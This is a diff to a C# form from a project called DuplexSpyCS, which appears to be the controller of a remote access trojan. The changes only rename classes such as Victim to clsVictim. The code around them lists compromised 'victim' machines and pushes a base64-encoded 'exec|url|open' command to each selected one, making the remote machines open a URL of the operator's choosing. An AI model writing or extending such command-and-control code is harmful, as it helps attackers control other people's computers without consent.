@@ -13,7 +13,7 @@ namespace DuplexSpyCS
     public partial class frmMultiURL : Form
     {
         public Form1 frmMain;
-        public List<Victim> m_lsVictim;
+        public List<clsVictim> m_lsVictim;
         private int nCnt = 0;
 
         public frmMultiURL()
@@ -21,7 +21,7 @@ namespace DuplexSpyCS
             InitializeComponent();
         }
 
-        void Received(Listener l, Victim v, string[] cmd)
+        void Received(clsTcpListener l, clsVictim v, string[] cmd)
         {
             if (cmd[0] == "exec")
             {
@@ -36,7 +36,7 @@ namespace DuplexSpyCS
             }
         }
 
-        public void UpdateStatus(Victim v, int nCode)
+        public void UpdateStatus(clsVictim v, int nCode)
         {
             Invoke(new Action(() =>
             {
@@ -64,7 +64,7 @@ namespace DuplexSpyCS
                 Close();
             }
 
-            foreach (Victim v in m_lsVictim)
+            foreach (clsVictim v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
                 item.SubItems.Add("?");
@@ -94,10 +94,10 @@ namespace DuplexSpyCS
 
             foreach (ListViewItem item in listView1.CheckedItems)
             {
-                Victim v = (Victim)item.Tag;
+                clsVictim v = (clsVictim)item.Tag;
                 ThreadPool.QueueUserWorkItem(x =>
                 {
-                    v.SendCommand($"exec|url|open|" + Crypto.b64E2Str(szURL));
+                    v.SendCommand($"exec|url|open|" + clsCrypto.b64E2Str(szURL));
                 });
             }
         }
